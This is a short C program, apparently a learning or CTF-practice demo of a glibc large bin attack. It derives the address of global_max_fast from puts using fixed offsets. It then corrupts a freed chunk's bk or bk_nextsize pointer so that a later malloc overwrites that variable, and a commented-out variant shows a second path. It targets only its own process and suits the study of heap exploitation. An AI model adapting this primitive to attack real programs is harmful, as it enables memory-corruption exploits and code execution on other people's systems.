#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

size_t getlibc()
{
    puts("getlibc");
    size_t libc_addr=puts-0x67870;
    size_t global_max_fast=libc_addr+0x39d848;
    return global_max_fast;
}
// 加入的large chunk小于最小，改bk_nextsize
// int main()
// {
//     size_t* chunk1=malloc(0x420);
//     malloc(0x10);
//     size_t* chunk2=malloc(0x410);
//     malloc(0x10);   
//     size_t* chunk3=malloc(0x400); // puts use
//     malloc(0x10); 

//     free(chunk3);  // puts use
//     size_t global_max_fast_20=getlibc()-0x20;
    
//     free(chunk1);
//     malloc(0x500);
//     free(chunk2);
//     chunk1[3]=global_max_fast_20;
//     malloc(0x500);
// }
int main()
{
    size_t* chunk1=malloc(0x410);
    malloc(0x10);
    size_t* chunk2=malloc(0x420);
    malloc(0x10);   
    size_t* chunk3=malloc(0x400); // puts use
    malloc(0x10); 

    free(chunk3);  // puts use
    size_t global_max_fast_20=getlibc()-0x20;
    
    free(chunk1);
    malloc(0x500);
    free(chunk2);
    chunk1[1]=global_max_fast_20+0x10;
    //chunk1[3]=global_max_fast_20;
    malloc(0x500);
}